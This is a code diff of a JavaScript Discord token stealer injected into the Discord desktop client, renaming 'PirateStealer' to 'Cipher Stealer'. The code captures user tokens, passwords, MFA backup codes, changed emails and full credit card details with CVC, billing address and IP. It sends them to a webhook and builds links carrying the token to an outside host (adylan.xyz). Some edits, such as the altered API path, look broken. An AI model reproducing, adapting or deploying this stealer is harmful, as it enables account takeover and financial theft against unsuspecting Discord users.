+									},
+									"thumbnail": {
+										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									}
+
+								}, {
+									"color": config['embed-color'],
+									"description": CalcFriends(),
+									"author": {
+                                        "icon_url": "https://media.discordapp.net/attachments/943421350134026311/966889152287236116/ologo_1.gif",
+										"name": "HQ Friends"
+									},
+									"footer": {
+										"text": "Cipher Stealer"
+									},
+
+								}]
 										}
 										SendToWebhook(JSON.stringify(params))
 									})
@@ -1075,14 +1057,14 @@ function ChangeEmail(newemail, password, token) {
 					if (token.startsWith("mfa")) {
 						window.webContents.executeJavaScript(`
               var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
+              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);
               xmlHttp.setRequestHeader('Content-Type', 'application/json');
               xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							var baseuri = "https://adylan.xyz/copy/"
 
 
 							var gayass = JSON.parse(codes)
@@ -1117,11 +1099,11 @@ function ChangeEmail(newemail, password, token) {
 								for (z of r) {
 									var b = GetRBadges(z.user.public_flags)
 									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+										gay += b + ` | \`${z.user.username}#${z.user.discriminator}\`\n`
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "*Nothing to see here*"
 								}
 								return gay
 							}
@@ -1148,11 +1130,11 @@ function ChangeEmail(newemail, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "PirateStealer",
+								username: "Cipher Stealer",
 								content: "",
 								embeds: [{
 									"title": "Email Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://adylan.xyz/copy/"+ token +")",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
@@ -1180,7 +1162,7 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, {
 										name: "New Email",
-										value: `\`${newemail}\``,
+										value: `\`${email}\``,
 										inline: !0
 									}, {
 										name: "Password",
@@ -1192,10 +1174,10 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "PirateStealer"
+										"name": "Cipher Stealer"
 									},
 									"footer": {
-										"text": "PirateStealer"
+										"text": "Cipher Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1205,10 +1187,10 @@ function ChangeEmail(newemail, password, token) {
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "PirateStealer"
+										"name": "Cipher Stealer"
 									},
 									"footer": {
-										"text": "PirateStealer"
+										"text": "Cipher Stealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1221,10 +1203,10 @@ function ChangeEmail(newemail, password, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "PirateStealer"
+									"name": "Cipher Stealer"
 								},
 								"footer": {
-									"text": "PirateStealer"
+									"text": "Cipher Stealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1309,11 +1291,11 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "PirateStealer",
+											username: "Cipher Stealer",
 											content: "",
 											embeds: [{
 												"title": "Email Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
+												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://adylan.xyz/copy/"+ token +")",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
@@ -1341,7 +1323,7 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, {
 													name: "New Email",
-													value: `\`${newemail}\``,
+													value: `\`${email}\``,
 													inline: !0
 												}, {
 													name: "Password",
@@ -1353,10 +1335,10 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "PirateStealer"
+													"name": "Cipher Stealer"
 												},
 												"footer": {
-													"text": "PirateStealer"
+													"text": "Cipher Stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1366,10 +1348,10 @@ function ChangeEmail(newemail, password, token) {
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": "PirateStealer"
+													"name": "Cipher Stealer"
 												},
 												"footer": {
-													"text": "PirateStealer"
+													"text": "Cipher Stealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1405,16 +1387,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			var params = {
-				username: "PirateStealer",
+				username: "Cipher Stealer",
 				content: "",
 				embeds: [{
 					"title": "User Credit Card Added",
 					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "PirateStealer"
+						"name": "Cipher Stealer"
 					},
 					"footer": {
-						"text": "PirateStealer"
+						"text": "Cipher Stealer"
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
@@ -1467,4 +1449,4 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 		}))
 	}
 });
-module.exports = require('./core.asar')
+module.exports = require('./core.asar');
